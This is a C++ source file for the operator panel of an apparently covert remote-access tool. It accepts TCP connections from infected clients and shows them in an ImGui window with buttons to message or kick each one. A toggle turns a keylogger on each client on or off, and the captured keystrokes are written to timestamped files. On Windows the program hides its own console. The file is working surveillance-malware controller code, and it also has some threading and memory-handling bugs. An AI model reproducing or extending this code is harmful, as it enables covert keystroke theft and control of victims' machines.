#include <bits/stdc++.h>

#include <SFML/Graphics.hpp>
#include <SFML/Network.hpp>
#include <imgui.h>
#include <imgui-SFML.h>

#include "PeerConnection.hpp"
#include "ImGuiStdString.hpp"
#include "ThreadWrapper.hpp"
#include "Message.hpp"
#include "ImGuiScrollableText.hpp"
#include "FunctionalityStruct.hpp"

#define DEFAULT_BUFLEN 2048
#define DEFAULT_PORT 62300

std::map<std::string, uint32_t> clientNamingPool;
GuiScrollableTextDisplay miniConsole;

///////////////////////////////////////////////////////

class ClientSession : public PeerConnection {
public:
    ClientSession(int socket, const sockaddr_in& clientAddress) {
        socketfile.store(socket);
        
        char* ip = inet_ntoa(clientAddress.sin_addr);
        peerIp = ip ? ip : "0.0.0.0";
        peerPort = ntohs(clientAddress.sin_port);
        connectionTime = std::chrono::system_clock::now();
        active.store(true);

        // Start listener thread
        std::thread([this]() {
            listenToClient();
        }).detach();

        sendPublicKey();
    }

    std::string makeWidgetName(const std::string& name, 
                             const std::string& postfix = "") const {
        return name + "##" + getPeerIpPort() + '_' + postfix;
    }

    FunctionalityStruct funcStruct;

private:
    void executeMessage(const Message& msg) {
        switch(msg.commandNumber) {
            case MessageDisableKeylog: {
                std::string filename = "keylog_" + getCurrentIsoTime() + ".txt";
                std::ofstream outfile(filename);
                if(!outfile) {
                    miniConsole.AddLineError("Keylogger data failed to save to file");
                    break;
                }
                outfile.write(msg.getBinaryData(), msg.getBinaryDataSize());
                outfile.close();
                miniConsole.AddLineInfo("Keylogger data saved to file %s", filename.c_str());
                break;
            }
        }
    }

    void listenToClient() {
        while (active.load()) {
            auto status = receiveData();
            
            switch (status) {
                case ReceiveStatus::Success: {
                    Message msg;
                    if (processCompleteMessage(msg)) {
                        miniConsole.AddLineSuccess("Successfully proceeded message %s", this->getPeerIpPort().c_str());
                        std::thread([&msg, this]() {
                            executeMessage(msg);
                        }).detach();
                    } else {
                        miniConsole.AddLineError("Failed to proceeded message %s", this->getPeerIpPort().c_str());
                    }
                    break;
                }
                case ReceiveStatus::KeyExchange:
                    miniConsole.AddLineSuccess("Successfully key exchange for client %s", this->getPeerIpPort().c_str());
                    break;
                case ReceiveStatus::PeerDisconnected:
                    miniConsole.AddLineInfo("Client disconnected: %s", this->getPeerIpPort().c_str());
                    break;
                case ReceiveStatus::NeedMoreData:
                    // Wait for more data
                    std::this_thread::sleep_for(std::chrono::milliseconds(10));
                    break;
                case ReceiveStatus::Error:
                    active.store(false);
                    return;
            }
        }
    }
};


/////////////////////////////////////////////////////// 

class ClientVector {
private:
    mutable std::mutex clientVecMutex;
    std::vector<ClientSession*> clientVec;

public:
    ClientVector() = default;
    ~ClientVector() {
        clear();
    }

    void removeInactive() {
        std::lock_guard<std::mutex> lock(clientVecMutex);
        auto removePtr = std::remove_if(clientVec.begin(), clientVec.end(),
            [](ClientSession* client) {
                return !client->isActive();
            });

        for(auto ite = removePtr; ite != clientVec.end(); ite++) {
            delete *ite;
        }

        clientVec.erase(removePtr, clientVec.end());
    }

    void add(ClientSession *client) {
        std::lock_guard<std::mutex> lock(clientVecMutex);
        clientVec.push_back(client);
    }

    size_t size() const {
        std::lock_guard<std::mutex> lock(clientVecMutex);
        return clientVec.size();
    }

    ClientSession* operator[](size_t index) {
        std::lock_guard<std::mutex> lock(clientVecMutex);
        return index < clientVec.size() ? clientVec[index] : nullptr;
    }

    void clear() {
        std::lock_guard<std::mutex> lock(clientVecMutex);
        for(auto ite = clientVec.begin(); ite != clientVec.end(); ite++) {
            delete *ite;
        }
    }

    // Broadcast a message to all active clients (thread-safe)
    bool broadcast(const Message& msg) {
        std::lock_guard<std::mutex> lock(clientVecMutex);
        bool success = true;
        for (auto& client : clientVec) {
            if (client->isActive()) {
                if (!client->sendData(msg)) {
                    success = false;
                }
            }
        }
        return success;
    }

    // Find a client by predicate (thread-safe)
    // template<typename Pred>
    // ClientSession* find(Pred pred) {
    //     std::lock_guard<std::mutex> lock(clientVecMutex);
    //     auto it = std::find_if(clientVec.begin(), clientVec.end(),
    //         [&pred](const std::unique_ptr<ClientSession>& client) {
    //             return pred(*client);
    //         });
    //     return it != clientVec.end() ? it->get() : nullptr;
    // }
};

///////////////////////////////////////////////////

ClientVector clientVector;

class ServerConnectionManager {
private:
    std::atomic<int> serverSocket{-1};
    std::atomic<bool> running{false};
    std::thread acceptThread;

    bool isInvalidAddress(const sockaddr_in* addr) const {
        // Filter 0.0.0.0:0
        if (addr->sin_addr.s_addr == 0 && addr->sin_port == 0) return true;
        
        // Filter broadcast addresses
        if (addr->sin_addr.s_addr == INADDR_BROADCAST) return true;

        return false;
    }

    void closesocket(int socketHandle) {
        #ifdef WIN32
        ::closesocket(socketHandle);
        #else
        close(socketHandle);
        #endif
    }

    void acceptClientLoop() {
        sockaddr_in incomingAddress;
        socklen_t incomingAddressSize = sizeof(incomingAddress);

        while (running.load()) {
            int clientSocket = accept(serverSocket.load(), 
                                    reinterpret_cast<sockaddr*>(&incomingAddress), 
                                    &incomingAddressSize);
            
            if (clientSocket == -1) {
                if (errno != EWOULDBLOCK) {
                    std::this_thread::sleep_for(std::chrono::milliseconds(100));
                }
                continue;
            }

            if (isInvalidAddress(&incomingAddress)) {
                closesocket(clientSocket);
                continue;
            }

            auto* newClient = new ClientSession(clientSocket, incomingAddress);
            clientVector.add(newClient);
            miniConsole.AddLineSuccess("Client %s connected!", newClient->getPeerIpPort().c_str());
        }
    }

public:
    ServerConnectionManager() = default;

    ~ServerConnectionManager() {
        disconnect();
    }

    bool init(uint16_t port = DEFAULT_PORT) {
        if (running.load()) return false;

        // Create server socket
        int newSocket = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (newSocket == -1) {
            return false;
        }

        // Set socket options
        int reuse = 1;
        setsockopt(newSocket, SOL_SOCKET, SO_REUSEADDR, reinterpret_cast<const char*>(&reuse), sizeof(reuse));

        /*
        // Non-blocking mode for graceful shutdown
        #ifdef WIN32
            u_long mode = 1;
            ioctlsocket(newSocket, FIONBIO, &mode);
        #else
            int flags = fcntl(newSocket, F_GETFL, 0);
            fcntl(newSocket, F_SETFL, flags | O_NONBLOCK);
        #endif
        */

        // Bind socket
        sockaddr_in sa;
        memset(&sa, 0, sizeof(sa));
        sa.sin_family = AF_INET;
        sa.sin_port = htons(port);
        sa.sin_addr.s_addr = htonl(INADDR_ANY);

        if (bind(newSocket, reinterpret_cast<sockaddr*>(&sa), sizeof(sa)) == -1) {
            closesocket(newSocket);
            return false;
        }

        // Listen
        if (listen(newSocket, SOMAXCONN) == -1) {
            closesocket(newSocket);
            return false;
        }

        serverSocket.store(newSocket);
        running.store(true);

        acceptThread = std::thread(&ServerConnectionManager::acceptClientLoop, this);
        acceptThread.detach();

        miniConsole.AddLineSuccess("Server initialized on port %d!", port);
        return true;
    }

    void disconnect() {
        if (!running.load()) return;
        running.store(false);

        int currentSocket = serverSocket.load();
        if (currentSocket != -1) {
            shutdown(currentSocket, 2);
            closesocket(currentSocket);
            serverSocket.store(-1);
        }

        miniConsole.AddLineInfo("Server stopped");
    }

    bool isRunning() const { return running.load(); }
};

///////////////////////////////////////////////////

void RunGui() {
    ImGui::Begin("Server Panel", nullptr, ImGuiWindowFlags_None);
    ImGui::SeparatorText("Connected Clients");
    ImGui::Text("Active clients: %zu", clientVector.size());
    
    for(int i=0; i < clientVector.size(); i++) {
        auto& client = *clientVector[i];
        const std::string headerLabel = client.getPeerIpPort() + "###" + client.getPeerIpPort();
        
        if (ImGui::CollapsingHeader(headerLabel.c_str())) {
            ImGui::Text("Connected for %llus", client.getConnectionDuration());
            
            ImGui::InputTextMultiline(client.makeWidgetName("Message Input").c_str(), &client.funcStruct.rawText, ImVec2(-1, 60));
            
            // Send button
            if (ImGui::Button(client.makeWidgetName("Send Message").c_str())) {
                if (client.funcStruct.rawText.size() > 0) {
                    std::thread([&client] {
                        Message textMessage;
                        textMessage.commandNumber = MessageRawText;
                        textMessage.setBinaryData(client.funcStruct.rawText.c_str(), client.funcStruct.rawText.size());
                        
                        if (client.sendData(textMessage)) {
                            miniConsole.AddLineSuccess("Raw text Message sent to %s", 
                                                        client.getPeerIpPort().c_str());
                        } else {
                            miniConsole.AddLineError("Failed to send raw text message to %s", 
                                                    client.getPeerIpPort().c_str());
                        }
                    }).detach();
                }
            }
            
            ImGui::SameLine();
            
            // Kick button
            if (ImGui::Button(client.makeWidgetName("Kick Client").c_str())) {
                std::thread([&client] {
                    client.disconnect();
                    miniConsole.AddLineWarning("Kicked client %s", client.getPeerIpPort().c_str());
                }).detach();
                clientVector.removeInactive();
            }

            if(ImGui::Checkbox("Func: Keylogger", &client.funcStruct.isKeyloggerActive)) {  //click -> already changed the state
                if(client.funcStruct.isKeyloggerActive) {
                    std::thread([&client] {
                        Message msg;
                        msg.commandNumber = MessageEnableKeylog;
                        
                        if (client.sendData(msg)) {
                            miniConsole.AddLineSuccess("Enable Keylogger Message sent to %s", 
                                                        client.getPeerIpPort().c_str());
                        } else {
                            miniConsole.AddLineError("Failed to send Enable Keylogger message to %s", 
                                                    client.getPeerIpPort().c_str());
                        }
                    }).detach();
                } else {
                    std::thread([&client] {
                        Message msg;
                        msg.commandNumber = MessageDisableKeylog;
                        
                        if (client.sendData(msg)) {
                            miniConsole.AddLineSuccess("Disable Keylogger Message sent to %s", 
                                                        client.getPeerIpPort().c_str());
                        } else {
                            miniConsole.AddLineError("Failed to send Disable Keylogger message to %s", 
                                                    client.getPeerIpPort().c_str());
                        }
                    }).detach();
                }
            }
        }
        clientVector.removeInactive();
    };
    
    // Console Section
    ImGui::SeparatorText("Console");
    miniConsole.Draw();
    
    // System Info Section
    ImGui::SeparatorText("System");
    ImGui::Text("Average FPS: %.1f", ImGui::GetIO().Framerate);
    
    ImGui::End();
}

void RunSFMLBackend() {
    sf::RenderWindow window(sf::VideoMode(800, 600), "ServerInterface", sf::Style::Titlebar | sf::Style::Close);
    // sf::RenderWindow window(sf::VideoMode(800, 600), "ServerInterface");
    window.setVerticalSyncEnabled(true);
    if(!ImGui::SFML::Init(window)) {
        throw new std::runtime_error("SFML ImGui can't be initialized!");
    }
    ImGui::StyleColorsDark();
    ImGuiIO& io = ImGui::GetIO(); (void)io;
    io.IniFilename = nullptr;

    sf::Clock deltaClock;
    while (window.isOpen()) {
        sf::Event event;
        while (window.pollEvent(event)) {
            ImGui::SFML::ProcessEvent(window, event);
            if (event.type == sf::Event::Closed) {
                window.close();
            }
        }

        ImGui::SFML::Update(window, deltaClock.restart());

        // ImGui::SetNextWindowSize(ImVec2(0, 0));
        // ImGui::SetWindowSize(ImVec2(500, 400));
        RunGui();

        window.clear(sf::Color(0, 0, 128, 255));
        ImGui::SFML::Render(window);
        window.display();
    }

    ImGui::SFML::Shutdown();
}

ServerConnectionManager connectionManager;

int main(void) {
    #ifdef WIN32
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
    #endif

    WSADATA wsaData;
    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed\n";
        return 1;
    }

    connectionManager.init();

    try {
        RunSFMLBackend();
    } catch (const std::exception& e) {
        std::cerr << "Fatal error: " << e.what() << std::endl;
    }

    connectionManager.disconnect();
    WSACleanup();
    return 0;
}